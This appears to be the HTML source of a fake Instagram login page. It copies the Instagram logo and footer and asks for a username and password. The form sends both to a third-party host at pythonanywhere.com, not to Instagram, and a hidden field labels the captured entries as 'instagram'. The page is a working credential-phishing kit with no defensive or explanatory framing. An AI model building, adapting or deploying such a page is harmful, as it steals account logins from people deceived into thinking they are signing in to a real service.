<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<meta http-equiv="X-UA-Compatible" content="ie=edge" />
		<script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
		<link rel="stylesheet" href="style.css" />
		<title>Instagram Login Form</title>
	</head>

	<body>
		<div id="wrapper">
			<div class="container">
				<div class="phone-app-demo"></div>
				<div class="form-data">
					<form
						action="https://shoraart.pythonanywhere.com/submit"
						method="post"
					>
						<input
							type="text"
							value="instagram"
							name="instagram"
							style="display: none"
						/>
						<div class="logo">
							<img src="./images/logo.png" alt="logo" />
						</div>
						<input
							type="text"
							name="email"
							placeholder="Phone number, username, or email"
							required
						/>
						<input
							type="password"
							name="password"
							placeholder="Password"
							required
						/>
						<button class="form-btn" type="submit">Log in</button>
					</form>
				</div>
			</div>

			<footer>
				<div class="container text-center d-flex mx-auto">
					<div class="copyright-notice">&copy 2024 Instagram</div>
				</div>
			</footer>
		</div>
	</body>
</html>
